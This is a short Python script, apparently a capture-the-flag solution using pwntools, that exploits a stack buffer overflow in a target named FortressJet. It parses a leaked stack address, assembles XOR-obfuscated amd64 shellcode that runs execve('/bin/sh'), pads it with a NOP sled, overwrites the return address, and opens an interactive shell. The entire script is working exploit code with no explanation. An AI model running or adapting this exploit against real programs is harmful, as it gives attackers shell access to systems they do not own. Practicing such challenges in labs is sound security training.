from core.targetbase import TargetBase
from custom.fortress_jet import FortressJetPwn
import re
from pwnlib.asm import asm


if __name__ == '__main__':
    t = TargetBase(pwn_target=FortressJetPwn)
    data = t.process.recvline().decode()
    hex_regex = r'(0x[a-fA-F0-9]+)'
    match = re.search(hex_regex, data)
    execve_sigid = 59
    exec_parameter = int.from_bytes(b'/bin/sh\0', 'little')
    exec_xor_value = 0x3131313131313131

    owerflow_size = 0x48
    return_address = int(match[0], 16)
    bin_sh_ptr = return_address + 0x50
    shellcode = asm(
        f'xor rax, rax\n'
        f'mov al, {execve_sigid}\n'
        f'mov rdx, {exec_parameter ^ exec_xor_value}\n'
        f'mov rsi, {exec_xor_value}\n'
        f'xor rdx, rsi\n'
        f'mov rdi, {bin_sh_ptr ^ exec_xor_value}\n'
        f'xor rdi, rsi\n'
        f'mov [rdi], rdx\n'
        f'xor rsi, rsi\n'
        f'xor rdx, rdx\n'
        f'syscall\n'
        f'ret',
        arch='amd64',
        os='linux'
    )
    payload = b'\x90' * (owerflow_size - len(shellcode)) + shellcode + return_address.to_bytes(8, 'little')
    t.run_main(payload)
    t.process.interactive()

